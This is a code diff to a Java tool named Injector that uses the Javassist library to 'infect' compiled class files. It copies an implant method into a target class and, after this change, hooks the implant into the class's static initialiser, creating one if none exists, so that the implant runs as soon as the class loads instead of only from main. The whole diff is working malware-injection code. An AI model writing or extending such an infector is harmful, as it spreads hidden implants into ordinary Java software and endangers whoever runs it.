@@ -1,5 +1,6 @@
 package org.example.injector;
 
+import javassist.CtClass;
 import javassist.bytecode.*;
 
 import java.io.*;
@@ -169,28 +170,36 @@ public class Injector {
 
     public static boolean infectTarget(final Path targetClassFilePath, final MethodInfo implantMethod) throws IOException {
         final ClassFile targetClass = readClassFile(targetClassFilePath);
+        final ConstPool constPool = targetClass.getConstPool();
 
-        MethodInfo main = targetClass.getMethod("main");
-        if (main == null) {
-            // Only infect classes with a main function.
-            return false;
+        MethodInfo currentClinit = targetClass.getMethod(MethodInfo.nameClinit);
+        if (currentClinit == null) {
+            // There are no static blocks in this class, create an empty one
+            currentClinit = new MethodInfo(constPool, MethodInfo.nameClinit, "()V");
+            ExceptionsAttribute excAttr = new ExceptionsAttribute(constPool);
+            currentClinit.setExceptionsAttribute(excAttr);
+            setStaticFlagForMethod(currentClinit);
+            Bytecode stubCode = new Bytecode(constPool, 0, 0);
+            stubCode.addReturn(CtClass.voidType);
+            currentClinit.setCodeAttribute(stubCode.toCodeAttribute());
+
+            try {
+                targetClass.addMethod(currentClinit);
+            } catch (DuplicateMemberException e) {
+                throw new RuntimeException("Internal error: clinit already exist despite not existing", e);
+            }
         }
 
         // Add the implant method to target class
         MethodInfo targetImplantMethod;
         try {
             // Construct a target method from the source (implant) method
-            ConstPool constPool = targetClass.getConstPool();
             targetImplantMethod = new MethodInfo(constPool, implantMethod.getName(), implantMethod.getDescriptor());
             targetImplantMethod.setExceptionsAttribute(implantMethod.getExceptionsAttribute());
             HashMap<String, String> classTranslation = new HashMap<>();
             CodeAttribute copy = (CodeAttribute) implantMethod.getCodeAttribute().copy(constPool, classTranslation);
             copy.setMaxLocals(10);  // Don't know why this is necessary, but it throws an error otherwise
-
-            // Make it static.
-            int accessFlags = implantMethod.getAccessFlags();
-            accessFlags |= AccessFlag.STATIC;   // Yes, bit-flipping!
-            targetImplantMethod.setAccessFlags(accessFlags);
+            setStaticFlagForMethod(targetImplantMethod);
 
             targetImplantMethod.getAttributes().removeIf(Objects::isNull);  // Cringe workaround due to internal bug in Javassist
             targetImplantMethod.setCodeAttribute(copy);
@@ -201,22 +210,26 @@ public class Injector {
             return false;
         }
 
-        // Modify the main method of the target class to run the implant method (before its own code)
-        Bytecode newCode = new Bytecode(targetClass.getConstPool());
-        newCode.addInvokestatic(targetClass.getName(), targetImplantMethod.getName(), targetImplantMethod.getDescriptor());
-        CodeAttribute newCodeAttr = newCode.toCodeAttribute();
-
-        CodeAttribute mainCode = main.getCodeAttribute();
-        ByteBuffer buff = ByteBuffer.allocate(newCodeAttr.getCodeLength() + main.getCodeAttribute().getCodeLength());
-        buff.put(newCodeAttr.getCode());
-        buff.put(mainCode.getCode());
-
-        CodeAttribute newCodeAttribute = new CodeAttribute(targetClass.getConstPool(), mainCode.getMaxStack(), mainCode.getMaxLocals(), buff.array(), mainCode.getExceptionTable());
-        main.setCodeAttribute(newCodeAttribute);
+        // Modify the clinit method of the target class to run the implant method (before its own code)
+        Bytecode additionalClinitCode = new Bytecode(constPool);
+        additionalClinitCode.addInvokestatic(targetClass.getName(), targetImplantMethod.getName(), targetImplantMethod.getDescriptor());
+        CodeAttribute additionalClinitCodeAttr = additionalClinitCode.toCodeAttribute();
+        CodeAttribute currentClinitCodeAttr = currentClinit.getCodeAttribute();
+        ByteBuffer concatenatedCode = ByteBuffer.allocate(additionalClinitCodeAttr.getCodeLength() + currentClinit.getCodeAttribute().getCodeLength());
+        concatenatedCode.put(additionalClinitCodeAttr.getCode());
+        concatenatedCode.put(currentClinitCodeAttr.getCode());
+        CodeAttribute newCodeAttribute = new CodeAttribute(constPool, currentClinitCodeAttr.getMaxStack(), currentClinitCodeAttr.getMaxLocals(), concatenatedCode.array(), currentClinitCodeAttr.getExceptionTable());
+        currentClinit.setCodeAttribute(newCodeAttribute);
 
         targetClass.write(new DataOutputStream(new FileOutputStream(targetClassFilePath.toFile())));
 
         return true;
+    }
+
+    private static void setStaticFlagForMethod(MethodInfo clinit) {
+        int accessFlags = clinit.getAccessFlags();
+        accessFlags |= AccessFlag.STATIC;   // Yes, bit-flipping!
+        clinit.setAccessFlags(accessFlags);
     }
 
     private static ClassFile readClassFile(Path classFilePath) throws IOException {
